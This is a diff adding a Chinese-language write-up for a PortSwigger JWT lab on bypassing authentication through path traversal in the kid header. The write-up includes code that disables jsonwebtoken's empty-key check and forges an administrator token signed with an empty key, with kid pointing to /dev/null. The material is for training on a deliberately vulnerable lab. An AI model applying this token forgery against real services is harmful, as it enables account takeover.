@@ -323,6 +323,54 @@ https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-kid-
 }
 ```
 
+## Lab: JWT authentication bypass via kid header path traversal
+
+| Dimension | Description                                                                                          |
+| --------- | ---------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-kid-parameter            |
+| Lab       | https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal |
+
+這題用 `wiener:peter` 登入後，拿到的 jwt token 解出來是
+
+```json
+{"kid":"9c1bd791-418f-46d0-9a5d-e1af3f3da139","alg":"HS256"}
+{"iss":"portswigger","exp":1761482635,"sub":"wiener"}
+```
+
+Burp Suite 好像無法生成空字串的 key (?)，[jwt.io](https://www.jwt.io/) 也不讓，嘗試用 [jsonwebtoken](https://www.npmjs.com/package/jsonwebtoken) 9.0.2 也不行，但只要把這段註解就可以
+
+node_modules/jsonwebtoken/sign.js
+
+```js
+if (!secretOrPrivateKey && options.algorithm !== "none") {
+  return failure(new Error("secretOrPrivateKey must have a value"));
+}
+```
+
+生成 token
+
+```js
+const token11 = sign(
+  { iss: "portswigger", exp: 1761565652, sub: "administrator" },
+  "",
+  {
+    noTimestamp: true,
+    keyid: "../../../../../../../../../../dev/null",
+    header: {
+      alg: "HS256",
+      typ: undefined,
+    },
+  },
+);
+console.log(token11);
+const decodeResult = decode(token11, { complete: true });
+console.log(decodeResult);
+```
+
+用多個 ../ 是因為我們不知道目錄有幾層深，所以用多個確保可以跳到 filesystem root，多餘的 ../ 會被忽略
+
+一樣，把 token 塞回 cookie，成功解題～
+
 ## 參考資料
 
 - https://portswigger.net/web-security/jwt
